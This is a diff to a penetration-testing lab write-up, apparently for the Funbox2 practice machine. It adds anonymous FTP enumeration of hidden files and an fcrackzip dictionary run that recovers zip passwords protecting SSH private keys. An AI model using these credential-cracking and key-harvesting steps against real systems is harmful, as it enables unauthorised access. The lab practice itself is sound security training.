@@ -160,7 +160,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds
 ```
 
 ## FTP
-```
+```shell
 > ftp 192.168.172.107
 Connected to 192.168.172.107.
 220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.172.107]
@@ -169,7 +169,7 @@ Name (192.168.172.107:superuser): anonymous
 Password: 
 230-Welcome, archive user anonymous@192.168.45.224 !
 230-
-230-The local time is: Fri Aug 09 06:01:26 2024
+230-The local time is: Fri Aug 09 07:47:29 2024
 230-
 230-This is an experimental FTP server.  If you have any unusual problems,
 230-please report them via e-mail to <root@funbox2>.
@@ -177,24 +177,48 @@ Password:
 230 Anonymous access granted, restrictions apply
 Remote system type is UNIX.
 Using binary mode to transfer files.
-
-ftp> ls
-229 Entering Extended Passive Mode (|||65460|)
+ftp> ls -lah
+229 Entering Extended Passive Mode (|||45500|)
 150 Opening ASCII mode data connection for file list
--rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
--rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
--rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
--rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
--rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
--rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
--rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
--rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
--rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
--r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
+drwxr-xr-x   2 ftp      ftp          4.0k Jul 25  2020 .
+drwxr-xr-x   2 ftp      ftp          4.0k Jul 25  2020 ..
+-rw-r--r--   1 ftp      ftp           153 Jul 25  2020 .@admins
+-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 anna.zip
+-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 ariel.zip
+-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 bud.zip
+-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 cathrine.zip
+-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 homer.zip
+-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 jessica.zip
+-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 john.zip
+-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 marge.zip
+-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 miriam.zip
+-r--r--r--   1 ftp      ftp          1.4k Jul 25  2020 tom.zip
+-rw-r--r--   1 ftp      ftp           114 Jul 25  2020 .@users
 -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
--rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
+-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 zlatan.zip
 226 Transfer complete
 ```
+
+```shell
+ftp> get .@admins
+local: .@admins remote: .@admins
+229 Entering Extended Passive Mode (|||10278|)
+150 Opening BINARY mode data connection for .@admins (153 bytes)
+100% |******************************************************************************************************************|   153        2.75 MiB/s    00:00 ETA
+226 Transfer complete
+153 bytes received in 00:00 (1.46 KiB/s
+```
+
+```shell
+ftp> get .@users
+local: .@users remote: .@users
+229 Entering Extended Passive Mode (|||22935|)
+150 Opening BINARY mode data connection for .@users (114 bytes)
+100% |******************************************************************************************************************|   114        1.84 MiB/s    00:00 ETA
+226 Transfer complete
+114 bytes received in 00:00 (1.15 KiB/s)
+```
+![image](https://github.com/user-attachments/assets/38f6c93a-4dc7-4e78-8bcf-3c83ad60c9a6)
 
 Download all zip files:
 ```shell
@@ -281,4 +305,33 @@ Crack downloaded .zip file:
 for> do echo "Cracking $file..."
 for> fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt "$file" || true
 for> done
+Cracking file anna.zip
+found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
+Cracking file ariel.zipeerat                        
+found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
+Cracking file bud.zipaneerat                        
+found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
+Cracking file cathrine.zipat                        
+found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
+
+
+PASSWORD FOUND!!!!: pw == catwoman
+Cracking file homer.zip
+found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
+Cracking file jessica.ziprat                        
+found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
+Cracking file john.zipneerat                        
+found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
+Cracking file marge.zipeerat                        
+found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
+Cracking file miriam.ziperat                        
+found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
+Cracking file tom.zipaneerat                        
+found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
+
+
+PASSWORD FOUND!!!!: pw == iubire
+Cracking file zlatan.zip
+found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
 ```
+![image](https://github.com/user-attachments/assets/19bd2395-68bd-404c-837b-bc38c1db96b9)
